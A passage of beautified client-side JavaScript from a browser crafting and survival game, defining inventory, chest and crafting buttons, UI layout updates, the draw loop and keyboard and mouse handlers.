      this.chest_buttons[le.LAVA_HEART].id = le.LAVA_HEART;
      this.inv_buttons[le.LAVA_HEART] = rs(60, 60, 0, sprite[Ie.INV_LAVA_HEART], 3);
      this.inv_buttons[le.LAVA_HEART].id = le.LAVA_HEART;
      this.inv_buttons[le.LAVA_HEART].info.img[2] = this.inv_buttons[le.LAVA_HEART].info.img[0];
      this.chest_buttons[le.REIDITE] = rs(68, 68, 0, sprite[Ie.CHEST_REIDITE], 3);
      this.chest_buttons[le.REIDITE].id = le.REIDITE;
      this.inv_buttons[le.REIDITE] = rs(60, 60, 0, sprite[Ie.INV_REIDITE], 3);
      this.inv_buttons[le.REIDITE].id = le.REIDITE;
      this.inv_buttons[le.REIDITE].info.img[2] = this.inv_buttons[le.REIDITE].info.img[0];
      this.chest_buttons[le.REIDITE_SWORD] = rs(68, 68, 0, sprite[Ie.CHEST_REIDITE_SWORD], 3);
      this.chest_buttons[le.REIDITE_SWORD].id = le.REIDITE_SWORD;
      this.inv_buttons[le.REIDITE_SWORD] = rs(60, 60, 0, sprite[Ie.INV_REIDITE_SWORD], 3);
      this.inv_buttons[le.REIDITE_SWORD].id = le.REIDITE_SWORD;
      this.craft_buttons[ue.REIDITE_SWORD] = rs(60, 60, 0, sprite[Ie.CRAFT_REIDITE_SWORD], 3);
      this.craft_buttons[ue.REIDITE_SWORD].id = ue.REIDITE_SWORD;
      this.chest_buttons[le.DIAMOND_PROTECTION] = rs(68, 68, 0, sprite[Ie.CHEST_DIAMOND_PROTECTION], 3);
      this.chest_buttons[le.DIAMOND_PROTECTION].id = le.DIAMOND_PROTECTION;
      this.inv_buttons[le.DIAMOND_PROTECTION] = rs(60, 60, 0, sprite[Ie.INV_DIAMOND_PROTECTION], 3);
      this.inv_buttons[le.DIAMOND_PROTECTION].id = le.DIAMOND_PROTECTION;
      this.craft_buttons[ue.DIAMOND_PROTECTION] = rs(60, 60, 0, sprite[Ie.CRAFT_DIAMOND_PROTECTION], 3);
      this.craft_buttons[ue.DIAMOND_PROTECTION].id = ue.DIAMOND_PROTECTION;
      this.chest_buttons[le.AMETHYST_PROTECTION] = rs(68, 68, 0, sprite[Ie.CHEST_AMETHYST_PROTECTION], 3);
      this.chest_buttons[le.AMETHYST_PROTECTION].id = le.AMETHYST_PROTECTION;
      this.inv_buttons[le.AMETHYST_PROTECTION] = rs(60, 60, 0, sprite[Ie.INV_AMETHYST_PROTECTION], 3);
      this.inv_buttons[le.AMETHYST_PROTECTION].id = le.AMETHYST_PROTECTION;
      this.craft_buttons[ue.AMETHYST_PROTECTION] = rs(60, 60, 0, sprite[Ie.CRAFT_AMETHYST_PROTECTION], 3);
      this.craft_buttons[ue.AMETHYST_PROTECTION].id = ue.AMETHYST_PROTECTION;
      this.chest_buttons[le.REIDITE_PROTECTION] = rs(68, 68, 0, sprite[Ie.CHEST_REIDITE_PROTECTION], 3);
      this.chest_buttons[le.REIDITE_PROTECTION].id = le.REIDITE_PROTECTION;
      this.inv_buttons[le.REIDITE_PROTECTION] = rs(60, 60, 0, sprite[Ie.INV_REIDITE_PROTECTION], 3);
      this.inv_buttons[le.REIDITE_PROTECTION].id = le.REIDITE_PROTECTION;
      this.craft_buttons[ue.REIDITE_PROTECTION] = rs(60, 60, 0, sprite[Ie.CRAFT_REIDITE_PROTECTION], 3);
      this.craft_buttons[ue.REIDITE_PROTECTION].id = ue.REIDITE_PROTECTION;
      this.chest_buttons[le.LAVA_HELMET] = rs(68, 68, 0, sprite[Ie.CHEST_LAVA_HELMET], 3);
      this.chest_buttons[le.LAVA_HELMET].id = le.LAVA_HELMET;
      this.inv_buttons[le.LAVA_HELMET] = rs(60, 60, 0, sprite[Ie.INV_LAVA_HELMET], 3);
      this.inv_buttons[le.LAVA_HELMET].id = le.LAVA_HELMET;
      this.craft_buttons[ue.LAVA_HELMET] = rs(60, 60, 0, sprite[Ie.CRAFT_LAVA_HELMET], 3);
      this.craft_buttons[ue.LAVA_HELMET].id = ue.LAVA_HELMET;
      this.chest_buttons[le.WITCH] = rs(68, 68, 0, sprite[Ie.CHEST_WITCH], 3);
      this.chest_buttons[le.WITCH].id = le.WITCH;
      this.inv_buttons[le.WITCH] = rs(60, 60, 0, sprite[Ie.INV_WITCH], 3);
      this.inv_buttons[le.WITCH].id = le.WITCH;
      this.craft_buttons[ue.WITCH] = rs(60, 60, 0, sprite[Ie.CRAFT_WITCH], 3);
      this.craft_buttons[ue.WITCH].id = ue.WITCH;
      this.chest_buttons[le.WAND1] = rs(68, 68, 0, sprite[Ie.CHEST_WAND1], 3);
      this.chest_buttons[le.WAND1].id = le.WAND1;
      this.inv_buttons[le.WAND1] = rs(60, 60, 0, sprite[Ie.INV_WAND1], 3);
      this.inv_buttons[le.WAND1].id = le.WAND1;
      this.craft_buttons[ue.WAND1] = rs(60, 60, 0, sprite[Ie.CRAFT_WAND1], 3);
      this.craft_buttons[ue.WAND1].id = ue.WAND1;
      this.chest_buttons[le.WAND2] = rs(68, 68, 0, sprite[Ie.CHEST_WAND2], 3);
      this.chest_buttons[le.WAND2].id = le.WAND2;
      this.inv_buttons[le.WAND2] = rs(60, 60, 0, sprite[Ie.INV_WAND2], 3);
      this.inv_buttons[le.WAND2].id = le.WAND2;
      this.craft_buttons[ue.WAND2] = rs(60, 60, 0, sprite[Ie.CRAFT_WAND2], 3);
      this.craft_buttons[ue.WAND2].id = ue.WAND2;
      this.chest_buttons[le.NIMBUS] = rs(68, 68, 0, sprite[Ie.CHEST_NIMBUS], 3);
      this.chest_buttons[le.NIMBUS].id = le.NIMBUS;
      this.inv_buttons[le.NIMBUS] = rs(60, 60, 0, sprite[Ie.INV_NIMBUS], 3);
      this.inv_buttons[le.NIMBUS].id = le.NIMBUS;
      this.craft_buttons[ue.NIMBUS] = rs(60, 60, 0, sprite[Ie.CRAFT_NIMBUS], 3);
      this.craft_buttons[ue.NIMBUS].id = ue.NIMBUS;
      this.chest_buttons[le.FIREFLY] = rs(68, 68, 0, sprite[Ie.CHEST_FIREFLY], 3);
      this.chest_buttons[le.FIREFLY].id = le.FIREFLY;
      this.inv_buttons[le.FIREFLY] = rs(60, 60, 0, sprite[Ie.INV_FIREFLY], 3);
      this.inv_buttons[le.FIREFLY].id = le.FIREFLY;
      this.craft_buttons[ue.FIREFLY] = rs(60, 60, 0, sprite[Ie.CRAFT_FIREFLY], 3);
      this.craft_buttons[ue.FIREFLY].id = ue.FIREFLY;
      this.chest_buttons[le.REIDITE_SPEAR] = rs(68, 68, 0, sprite[Ie.CHEST_REIDITE_SPEAR], 3);
      this.chest_buttons[le.REIDITE_SPEAR].id = le.REIDITE_SPEAR;
      this.inv_buttons[le.REIDITE_SPEAR] = rs(60, 60, 0, sprite[Ie.INV_REIDITE_SPEAR], 3);
      this.inv_buttons[le.REIDITE_SPEAR].id = le.REIDITE_SPEAR;
      this.craft_buttons[ue.REIDITE_SPEAR] = rs(60, 60, 0, sprite[Ie.CRAFT_REIDITE_SPEAR], 3);
      this.craft_buttons[ue.REIDITE_SPEAR].id = ue.REIDITE_SPEAR;
      this.chest_buttons[le.REIDITE_HELMET] = rs(68, 68, 0, sprite[Ie.CHEST_REIDITE_HELMET], 3);
      this.chest_buttons[le.REIDITE_HELMET].id = le.REIDITE_HELMET;
      this.inv_buttons[le.REIDITE_HELMET] = rs(60, 60, 0, sprite[Ie.INV_REIDITE_HELMET], 3);
      this.inv_buttons[le.REIDITE_HELMET].id = le.REIDITE_HELMET;
      this.craft_buttons[ue.REIDITE_HELMET] = rs(60, 60, 0, sprite[Ie.CRAFT_REIDITE_HELMET], 3);
      this.craft_buttons[ue.REIDITE_HELMET].id = ue.REIDITE_HELMET;
      this.chest_buttons[le.LAVA_SPEAR] = rs(68, 68, 0, sprite[Ie.CHEST_LAVA_SPEAR], 3);
      this.chest_buttons[le.LAVA_SPEAR].id = le.LAVA_SPEAR;
      this.inv_buttons[le.LAVA_SPEAR] = rs(60, 60, 0, sprite[Ie.INV_LAVA_SPEAR], 3);
      this.inv_buttons[le.LAVA_SPEAR].id = le.LAVA_SPEAR;
      this.craft_buttons[ue.LAVA_SPEAR] = rs(60, 60, 0, sprite[Ie.CRAFT_LAVA_SPEAR], 3);
      this.craft_buttons[ue.LAVA_SPEAR].id = ue.LAVA_SPEAR;
      this.chest_buttons[le.LAVA_SWORD] = rs(68, 68, 0, sprite[Ie.CHEST_LAVA_SWORD], 3);
      this.chest_buttons[le.LAVA_SWORD].id = le.LAVA_SWORD;
      this.inv_buttons[le.LAVA_SWORD] = rs(60, 60, 0, sprite[Ie.INV_LAVA_SWORD], 3);
      this.inv_buttons[le.LAVA_SWORD].id = le.LAVA_SWORD;
      this.craft_buttons[ue.LAVA_SWORD] = rs(60, 60, 0, sprite[Ie.CRAFT_LAVA_SWORD], 3);
      this.craft_buttons[ue.LAVA_SWORD].id = ue.LAVA_SWORD;
      this.chest_buttons[le.LAVA_ORB] = rs(68, 68, 0, sprite[Ie.CHEST_LAVA_ORB], 3);
      this.chest_buttons[le.LAVA_ORB].id = le.LAVA_ORB;
      this.inv_buttons[le.LAVA_ORB] = rs(60, 60, 0, sprite[Ie.INV_LAVA_ORB], 3);
      this.inv_buttons[le.LAVA_ORB].id = le.LAVA_ORB;
      this.chest_buttons[le.EGG0] = rs(68, 68, 0, sprite[Ie.CHEST_EGG0], 3);
      this.chest_buttons[le.EGG0].id = le.EGG0;
      this.inv_buttons[le.EGG0] = rs(60, 60, 0, sprite[Ie.INV_EGG0], 3);
      this.inv_buttons[le.EGG0].id = le.EGG0;
      this.chest_buttons[le.EGG1] = rs(68, 68, 0, sprite[Ie.CHEST_EGG1], 3);
      this.chest_buttons[le.EGG1].id = le.EGG1;
      this.inv_buttons[le.EGG1] = rs(60, 60, 0, sprite[Ie.INV_EGG1], 3);
      this.inv_buttons[le.EGG1].id = le.EGG1;
      this.chest_buttons[le.EGG2] = rs(68, 68, 0, sprite[Ie.CHEST_EGG2], 3);
      this.chest_buttons[le.EGG2].id = le.EGG2;
      this.inv_buttons[le.EGG2] = rs(60, 60, 0, sprite[Ie.INV_EGG2], 3);
      this.inv_buttons[le.EGG2].id = le.EGG2;
      this.chest_buttons[le.EGG3] = rs(68, 68, 0, sprite[Ie.CHEST_EGG3], 3);
      this.chest_buttons[le.EGG3].id = le.EGG3;
      this.inv_buttons[le.EGG3] = rs(60, 60, 0, sprite[Ie.INV_EGG3], 3);
      this.inv_buttons[le.EGG3].id = le.EGG3;
      this.chest_buttons[le.EGG4] = rs(68, 68, 0, sprite[Ie.CHEST_EGG4], 3);
      this.chest_buttons[le.EGG4].id = le.EGG4;
      this.inv_buttons[le.EGG4] = rs(60, 60, 0, sprite[Ie.INV_EGG4], 3);
      this.inv_buttons[le.EGG4].id = le.EGG4;
      this.update_craft_buttons = function () {
        for (var e = __.craft.can_craft, i = 10, t = 10, r = 0; r < e.length; r++) {
          if (r > 0 && !(r % 4)) {
            i += e[0].info.width + 10;
            t = 10;
          }
          e[r].info.translate.x = i;
          e[r].info.translate.y = t;
          t += 10 + e[r].info.height;
        }
      };
      this.update_chest_buttons = function () {
        for (var e = Math.floor(Math.floor((3 + __.craft.can_craft.length) / 4) * (10 + this.chest_buttons[0].info.img[0].width) + 35), i = 0; i < this.chest_buttons.length; i++) {
          if (this.chest_buttons[i]) {
            this.chest_buttons[i].info.translate.x = e;
            this.chest_buttons[i].info.translate.y = 22;
          }
        }
        this.chest_lockpick.info.translate.x = e + 17;
        this.chest_lockpick.info.translate.y = 22 + sprite[Ie.CHEST_SLOT].height;
        this.chest_locked.info.translate.x = e + 17;
        this.chest_locked.info.translate.y = 30;
        this.chest_padlock.info.translate.x = e + 17;
        this.chest_padlock.info.translate.y = 22 + sprite[Ie.CHEST_SLOT].height;
      };
      this.update_team_buttons = function () {
        for (var e = Math.floor((S - sprite[Ie.TEAM_BUTTON][0].width) / 2), i = 0; i < this.team_buttons.length; i++) {
          this.team_buttons[i].button.info.translate.x = e;
          this.team_buttons[i].button.info.translate.y = -13;
        }
      };
      this.update_bread_oven_button = function () {
        var e = 12 + Math.floor(Math.floor((3 + __.craft.can_craft.length) / 4) * (10 + this.bread_oven_wood_button.info.img[0].width) + 35);
        this.bread_oven_wood_button.info.translate.x = e;
        this.bread_oven_wood_button.info.translate.y = 33;
        this.bread_oven_flour_button.info.translate.x = this.bread_oven_wood_button.info.translate.x;
        this.bread_oven_flour_button.info.translate.y = 137;
        this.bread_oven_bread_button.info.translate.x = this.bread_oven_wood_button.info.translate.x;
        this.bread_oven_bread_button.info.translate.y = 240;
      };
      this.update_extractor_button = function () {
        var e = 12 + Math.floor(Math.floor((3 + __.craft.can_craft.length) / 4) * (10 + this.extractor_wood_button.info.img[0].width) + 35);
        this.extractor_wood_button.info.translate.x = e;
        this.extractor_wood_button.info.translate.y = 36;
        e += 83;
        this.extractor_stone_button.info.translate.x = e;
        this.extractor_stone_button.info.translate.y = 36;
        this.extractor_gold_button.info.translate.x = e;
        this.extractor_gold_button.info.translate.y = 36;
        this.extractor_diamond_button.info.translate.x = e;
        this.extractor_diamond_button.info.translate.y = 36;
        this.extractor_amethyst_button.info.translate.x = e;
        this.extractor_amethyst_button.info.translate.y = 36;
        this.extractor_reidite_button.info.translate.x = e;
        this.extractor_reidite_button.info.translate.y = 36;
      };
      this.update_windmill_button = function () {
        var e = 12 + Math.floor(Math.floor((3 + __.craft.can_craft.length) / 4) * (10 + this.windmill_wheat_button.info.img[0].width) + 35);
        this.windmill_wheat_button.info.translate.x = e;
        this.windmill_wheat_button.info.translate.y = 36;
        e += 83;
        this.windmill_flour_button.info.translate.x = e;
        this.windmill_flour_button.info.translate.y = 36;
      };
      this.update_furnace_button = function () {
        var e = Math.floor(Math.floor((3 + __.craft.can_craft.length) / 4) * (10 + this.furnace_button.info.img[0].width) + 35);
        this.furnace_button.info.translate.x = e;
        this.furnace_button.info.translate.y = 22;
      };
      this.update_inv_buttons = function () {
        var e = __.inv.can_select;
        if (e.length > 0) {
          var i = Math.floor((S - (e[0].info.width + 5) * __.inv.max) / 2);
        }
        for (var t = 0; t < e.length; t++) {
          e[t].info.translate.x = i + (e[t].info.width + 5) * t;
          e[t].info.translate.y = p - e[t].info.width - 10;
          this.plus_buttons[e[t].id].info.translate.x = e[t].info.translate.x + 13;
          this.plus_buttons[e[t].id].info.translate.y = e[t].info.translate.y - this.plus_buttons[e[t].id].info.img[0].height - 6;
        }
      };
      var s;
      var _ = 0;
      var E = function () {
        t.update();
        if (++_ == 30) {
          t.add_event_listener();
          return void t.update();
        }
        window.setTimeout(E, 33);
      };
      this.quit = function (e) {
        if (__.chat.open) {
          __.chat.quit();
        }
        if (__.terminal.open) {
          __.terminal.quit();
        }
        document.getElementById("team_box").style.display = "none";
        t.market.style.display = "none";
        t.market.open = false;
        t.sign.style.display = "none";
        t.sign.open = false;
        document.getElementById("shop_starterkit").style.display = "none";
        document.getElementById("home_craft").style.display = "none";
        document.getElementById("recipe_craft").style.display = "none";
        t.craft_list.open = false;
        document.getElementById("option_in_game").style.display = "none";
        t.options.open = false;
        document.getElementById("sure_delete").style.display = "none";
        t.safe_delete.open = false;
        document.getElementById("cancel_sure_delete").style.display = "none";
        t.safe_cancel.open = false;
        document.getElementById("chronoquest").style.display = "none";
        t.quests.open = false;
        s = e;
        t.remove_event_listener();
        t.can.style.cursor = t.cursor0;
        A_.quit();
        T = -1;
        A();
      };
      var T = -1;
      var A = function () {
        t.update();
        if (++T == 30) {
          t.stop();
          return void s();
        }
        window.setTimeout(A, 33);
      };
      this.is_run = false;
      this.stop = function () {
        this.is_run = false;
      };
      this.run = function () {
        client.change_ground();
        t.is_run = true;
        T = -1;
        _ = 0;
        E();
      };
      this.update = function () {
        this.leaderboard.translate.x = S - this.leaderboard.img.width - 10;
        this.leaderboard.translate.y = 5;
        s_.clock.translate.x = this.leaderboard.translate.x - sprite[Ie.CLOCK][0].width - 85;
        s_.clock.translate.y = 10;
        this.craft_list.button.info.translate.x = this.leaderboard.translate.x - sprite[Ie.RECIPE_BUTTON][0].width - 10;
        this.craft_list.button.info.translate.y = 10;
        this.quests.button.info.translate.x = this.leaderboard.translate.x - sprite[Ie.QUEST_BUTTON][0].width - 20;
        this.quests.button.info.translate.y = this.craft_list.button.info.translate.y + sprite[Ie.RECIPE_BUTTON][0].height + 5;
        this.options.button.info.translate.x = this.leaderboard.translate.x - sprite[Ie.OPTION_BUTTON][0].width - 20;
        this.options.button.info.translate.y = this.quests.button.info.translate.y + sprite[Ie.OPTION_BUTTON][0].height + 18;
        this.audio.button_on.info.translate.x = this.leaderboard.translate.x - sprite[Ie.OPTION_BUTTON][0].width - 20;
        this.audio.button_on.info.translate.y = this.options.button.info.translate.y + sprite[Ie.SOUND_BUTTON_OFF][0].height;
        this.audio.button_off.info.translate.x = this.leaderboard.translate.x - sprite[Ie.OPTION_BUTTON][0].width - 20;
        this.audio.button_off.info.translate.y = this.options.button.info.translate.y + sprite[Ie.SOUND_BUTTON_OFF][0].height;
        this.market.button.info.translate.x = this.leaderboard.translate.x - sprite[Ie.MARKET_BUTTON][0].width - 20;
        this.market.button.info.translate.y = this.audio.button_on.info.translate.y + sprite[Ie.MARKET_BUTTON][0].height;
        __.auto_feed.translate.x = this.leaderboard.translate.x - 63 - 85;
        __.auto_feed.translate.y = 100;
        __.show_spectators.translate.x = this.leaderboard.translate.x - sprite[Ie.SHOW_SPECTATORS].width - 85;
        __.show_spectators.translate.y = __.auto_feed.translate.y + 10 + sprite[Ie.AUTO_FEED].height;
        this.minimap.translate.y = p - 3 - 193;
        this.minimap.translate.x = S - 3 - 193;
        this.gauges.translate.x = 5;
        this.gauges.translate.y = p - this.gauges.img.height - 5;
        this.shop.button.info.translate.x = m - 45.5;
        this.shop.button.info.translate.y = 50;
        this.update_craft_buttons();
        this.update_inv_buttons();
        this.update_chest_buttons();
        this.update_furnace_button();
        this.update_windmill_button();
        this.update_extractor_button();
        this.update_bread_oven_button();
        this.update_team_buttons();
        this.sign.update_button();
        fn();
        __.chat.update();
        __.terminal.update();
        this.team_box.update();
        this.craft_list.home.update();
        this.craft_list.list.update();
        this.safe_delete.update();
        this.safe_cancel.update();
        this.quests.update();
        this.shop.update();
        this.options.update();
        this.market.update();
        this.sign.update();
        var e = 0;
        if (_ != 30) {
          e = 1500 / (_ + 1) - 50;
        }
        if (T != -1) {
          e = -(1500 / (30 - T + 1) - 48);
        }
        this.shop.button.info.translate.y -= e > 0 ? e : -e;
        this.leaderboard.translate.y -= e > 0 ? e : -e;
        __.auto_feed.translate.y -= e > 0 ? e : -e;
        __.show_spectators.translate.y -= e > 0 ? e : -e;
        this.craft_list.button.info.translate.y -= e > 0 ? e : -e;
        this.quests.button.info.translate.y -= e > 0 ? e : -e;
        this.options.button.info.translate.y -= e > 0 ? e : -e;
        this.market.button.info.translate.y -= e > 0 ? e : -e;
        this.audio.button_on.info.translate.y -= e > 0 ? e : -e;
        this.audio.button_off.info.translate.y -= e > 0 ? e : -e;
        s_.clock.translate.y -= e > 0 ? e : -e;
        this.gauges.translate.y -= e < 0 ? e : -e;
        this.minimap.translate.y -= e < 0 ? e : -e;
      };
      this.draw_UI = function () {
        if (!__.ghost.enabled && this.show_ui) {
          xn();
        }
        Fn();
        (function () {
          var e = s_.units[us.PLAYERS];
          if (s_.mode === ds.MODE_PVP || s_.mode === ds.MODE_EXPERIMENTAL || s_.mode === ds.MODE_ZOMBIES || s_.mode === ds.MODE_LEGACY || s_.mode === ds.MODE_BR || s_.mode === ds.MODE_VAMPIRES) {
            for (var i = 0; i < e.length; i++) {
              e[i].draw_text();
            }
          } else if (s_.mode === ds.MODE_HUNGER_GAMES) {
            for (i = 0; i < e.length; i++) {
              if (__.spectator || __.show_spectators.enabled || e[i].player.nickname !== "spectator") {
                e[i].draw_text();
              }
            }
          }
        })();
        if (this.show_ui) {
          Bn();
          if (this.show_recipe_book === 1) {
            this.craft_list.button.draw(i);
          }
          if (s_.mode !== ds.MODE_ZOMBIES && s_.mode !== ds.MODE_LEGACY && s_.mode !== ds.MODE_BR && this.show_quest === 1) {
            this.quests.button.draw(i);
          }
          this.options.button.draw(i);
          if (this.show_market === 1) {
            this.market.button.draw(i);
          }
          if (A_.run) {
            this.audio.button_on.draw(i);
          } else {
            this.audio.button_off.draw(i);
          }
          Vn();
          Wn();
          this.gauges.draw();
          kn();
          Yn();
          Un();
          wn();
          Jn();
          Hn();
          Ln();
          (function () {
            if (!(__.chest.open || __.furnace.open || __.windmill.open || __.bread_oven.open || __.extractor.open)) {
              __.well.open = false;
              var e = s_.fast_units[__.uid];
              var i = ds.DIST_WELL;
              if (e) {
                for (var t = 0; t < s_.units[us.WELL].length; t++) {
                  var r = s_.units[us.WELL][t];
                  var n = Utils.dist(r, e);
                  if (n < i) {
                    i = n;
                    __.well.open = true;
                    __.well.pid = r.pid;
                    __.well.iid = r.id;
                  }
                }
              }
            }
          })();
          Mn();
          vn();
          mn();
          pn();
          fn();
          bn();
        }
        if (__.ghost.enabled) {
          Gn();
        }
        Pn();
        if (this.show_ui && this.show_clock === 1) {
          Kn();
        }
        __.welcome.draw();
        __.alert.draw("#FFF", "#000");
        if (this.show_ui) {
          __.ghost.draw();
          __.shop.draw();
          __.inv.drag.draw(h_.pos.x, h_.pos.y);
        }
        yn();
      };
      this.update_scene = function () {
        __.cam.update();
        __.gauges.update();
        if (!__.reconnect.enabled && __.alive) {
          __.control.update();
          __.auto_feed.update();
        }
        s_.update();
        this.quests.update_chrono();
      };
      this.draw_scene = function () {
        Xo();
      };
      this.update_connection = function () {
        client.check_state();
        client.check_pong();
        client.try_ping();
        client.update_cam();
      };
      this.draw = function () {
        if (!__.reconnect.enabled && __.alive) {
          this.update_connection();
        }
        A_.scheduler();
        this.update_scene();
        if (n_.hijackedAsset !== 1) {
          this.draw_scene();
          this.draw_UI();
        } else {
          var e = IMAGES.CHEATING_BOX;
          Nn(i, e, m - e.width / 4, v - e.height / 4, e.width / 2, e.height / 2);
        }
      };
      this.trigger_keyup = function (e) {
        if (__.chat.open && e.keyCode === 27) {
          __.chat.quit();
        } else if (__.terminal.open && e.keyCode === 27) {
          __.terminal.quit();
        } else if (__.chat.open || __.terminal.open || e.keyCode != 79 || T != -1) {
          if (e.keyCode == 13 && T == -1) {
            if (__.terminal.open) {
              __.terminal._send();
            } else {
              __.chat.run();
            }
          } else if (!__.chat.open && !__.terminal.open) {
            if (e.keyCode === 82) {
              __.auto_feed.invert();
            } else if (e.keyCode !== 80 || s_.mode !== ds.MODE_HUNGER_GAMES || __.spectator) {
              if (e.keyCode >= 49 && e.keyCode <= 57) {
                if (__.craft.id < 0) {
                  var i = e.keyCode - 49;
                  var t = __.inv.can_select[i];
                  if (t) {
                    client.select_inv(t.id, i);
                  }
                }
              } else if (e.keyCode == 89) {
                __.bigmap = !__.bigmap;
              } else if (e.keyCode == 71) {
                __.craft.change_mode();
              }
            } else {
              __.show_spectators.invert();
            }
          }
        } else {
          __.terminal._open();
        }
        d_.up(e);
      };
      this.trigger_keydown = function (e) {
        d_.down(e);
        if (!(e.keyCode != 8 || __.chat.open || __.terminal.open)) {
          e.preventDefault();
        }
      };
      this.trigger_mousedown = function (e) {
        h_.pos = is(t.can, e);
        var i = false;
        if (__.craft.preview < 0) {
          t.minimap.focus(h_.pos);
        }
        var r = __.chest;
        if (__.craft.id < 0 && r.id >= 0) {
          if (!(__.chest.lock && __.chest.pid !== __.id)) {
            i |= t.chest_buttons[__.chest.id].trigger(t.can, h_.pos, jo);
          }
        }
        var n = __.windmill;
        if (n.open && n.amount_flour > 0) {
          i |= t.windmill_flour_button.trigger(t.can, h_.pos, jo);
        }
        var a = __.extractor;
        if (a.open && a.amount_mineral > 0) {
          i |= t.extractor_stone_button.trigger(t.can, h_.pos, jo);
          i |= t.extractor_gold_button.trigger(t.can, h_.pos, jo);
          i |= t.extractor_diamond_button.trigger(t.can, h_.pos, jo);
          i |= t.extractor_amethyst_button.trigger(t.can, h_.pos, jo);
          i |= t.extractor_reidite_button.trigger(t.can, h_.pos, jo);
        }
        var o = __.bread_oven;
        if (o.open && o.amount_bread > 0) {
          i |= t.bread_oven_bread_button.trigger(t.can, h_.pos, jo);
        }
        if (__.sign.open) {
          i |= t.sign.button.trigger(t.can, h_.pos, jo);
        }
        if (!__.chest.lock) {
          if (__.chest.padlock) {
            i |= t.chest_padlock.trigger(t.can, h_.pos, jo);
          }
        }
        if (__.chest.lockpick) {
          i |= t.chest_lockpick.trigger(t.can, h_.pos, jo);
        }
        if (__.craft.id < 0 && !t.craft_list.open && !t.safe_delete.open && !t.safe_cancel.open && !t.quests.open && !t.options.open && !t.market.open) {
          for (var s = __.inv.can_select, _ = 0; _ < s.length; _++) {
            var E = s[_].trigger(t.can, h_.pos, jo);
            i |= E;
            if (E) {
              __.inv.drag.start(_, h_.pos);
            }
            if (r.open && (r.id < 0 || r.id == s[_].id) || __.furnace.open && s[_].id === le.WOOD || __.well.open && s[_].id === le.BUCKET_FULL || __.bread_oven.open && (s[_].id === le.WOOD || s[_].id === le.FLOUR) || __.windmill.open && s[_].id === le.WILD_WHEAT || __.extractor.open && s[_].id === le.WOOD) {
              i |= t.plus_buttons[s[_].id].trigger(t.can, h_.pos, jo);
            }
          }
        }
        if (__.resurrection.open) {
          i |= t.resurrection.trigger(t.can, h_.pos, jo);
        }
        if (t.team_buttons_id != -1) {
          if (i |= t.team_buttons[t.team_buttons_id].button.trigger(t.can, h_.pos, jo)) {
            var T = true;
          }
        } else {
          T = false;
        }
        if (__.craft.id < 0 && __.craft.preview < 0 && !T && !t.craft_list.open && !t.safe_delete.open && !t.options.open && !t.safe_cancel.open && !t.market.open) {
          s = __.craft.can_craft;
          _ = 0;
          s = __.craft.can_craft;
          _ = 0;
          for (; _ < s.length; _++) {
            i |= s[_].trigger(t.can, h_.pos, jo);
          }
        }
        if (!(!(__.craft.id < 0 && __.craft.preview < 0 && __.shop.open) || t.craft_list.open || t.safe_delete.open || t.options.open || t.safe_cancel.open || t.quests.open || t.market.open)) {
          i |= t.shop.button.trigger(t.can, h_.pos, jo);
        }
        if (!(!(__.craft.preview < 0) || t.safe_delete.open || t.options.open || t.safe_cancel.open || t.quests.open || t.market.open)) {
          i |= t.craft_list.button.trigger(t.can, h_.pos, jo);
        }
        if (!(!(__.craft.preview < 0) || t.craft_list.open || t.safe_delete.open || t.safe_cancel.open || t.quests.open || t.market.open)) {
          i |= t.options.button.trigger(t.can, h_.pos, jo);
        }
        if (!(!(__.craft.preview < 0) || t.craft_list.open || t.safe_delete.open || t.safe_cancel.open || t.quests.open || t.options.open)) {
          i |= t.market.button.trigger(t.can, h_.pos, jo);
        }
        if (!(!(__.craft.preview < 0) || t.craft_list.open || t.safe_delete.open || t.safe_cancel.open || t.quests.open || t.options.open || t.market.open)) {
          if (A_.run) {
            i |= t.audio.button_on.trigger(t.can, h_.pos, jo);
          } else {
            i |= t.audio.button_off.trigger(t.can, h_.pos, jo);
          }
        }
        if (!(!(__.craft.preview < 0) || t.craft_list.open || t.market.open || t.safe_delete.open || t.options.open || t.safe_cancel.open || s_.mode === ds.MODE_ZOMBIES || s_.mode === ds.MODE_LEGACY || s_.mode === ds.MODE_BR)) {
          i |= t.quests.button.trigger(t.can, h_.pos, jo);
        }
        if (!(i || t.craft_list.open || t.safe_delete.open || t.options.open || t.safe_cancel.open || t.quests.open || t.market.open || t.sign.open)) {
          if (__.craft.preview >= 0) {
            client.send_build();
          } else if (!T) {
            h_.down();
          }
        }
      };
      this.trigger_mouseup = function (e) {
        h_.pos = is(t.can, e);
        h_.up();
        if (!__.inv.drag.release()) {
          var i = __.chest;
          var r = __.furnace;
          var n = __.well;
          var a = __.windmill;
          var o = __.extractor;
          var s = __.bread_oven;
          if (__.control.attack) {
            __.control.attack = 0;
            client.stop_attack();
          }
          if (t.team_buttons_id != -1) {
            var _ = t.team_buttons[t.team_buttons_id].button.trigger(t.can, h_.pos, Zo);
            var E = document.getElementById("team_box").style;
            if (_ && E.display == "inline-block") {
              return void (E.display = "none");
            }
            if (_) {
              t.team_buttons[t.team_buttons_id].action();
            }
          }
          if (__.craft.id < 0 && i.id >= 0 && !t.safe_delete.open) {
            if (!__.chest.lock || __.chest.pid === __.id) {
              if (_ = t.chest_buttons[__.chest.id].trigger(t.can, h_.pos, Zo)) {
                client.take_chest(i);
              }
            }
          }
          if ((a = __.windmill).open && a.amount_flour > 0 && !t.safe_delete.open) {
            if (_ = t.windmill_flour_button.trigger(t.can, h_.pos, Zo)) {
              client.take_flour(a);
            }
          }
          if ((o = __.extractor).open && o.amount_mineral > 0 && !t.safe_delete.open) {
            switch (o.type) {
              case us.EXTRACTOR_MACHINE_STONE:
                if (_ = t.extractor_stone_button.trigger(t.can, h_.pos, Zo)) {
                  client.take_extractor(o);
                }
                break;
              case us.EXTRACTOR_MACHINE_GOLD:
                if (_ = t.extractor_gold_button.trigger(t.can, h_.pos, Zo)) {
                  client.take_extractor(o);
                }
                break;
              case us.EXTRACTOR_MACHINE_DIAMOND:
                if (_ = t.extractor_diamond_button.trigger(t.can, h_.pos, Zo)) {
                  client.take_extractor(o);
                }
                break;
              case us.EXTRACTOR_MACHINE_AMETHYST:
                if (_ = t.extractor_amethyst_button.trigger(t.can, h_.pos, Zo)) {
                  client.take_extractor(o);
                }
                break;
              case us.EXTRACTOR_MACHINE_REIDITE:
                if (_ = t.extractor_reidite_button.trigger(t.can, h_.pos, Zo)) {
                  client.take_extractor(o);
                }
            }
          }
          if ((s = __.bread_oven).open && s.amount_bread > 0 && !t.safe_delete.open) {
            if (_ = t.bread_oven_bread_button.trigger(t.can, h_.pos, Zo)) {
              client.take_bread(s);
            }
          }
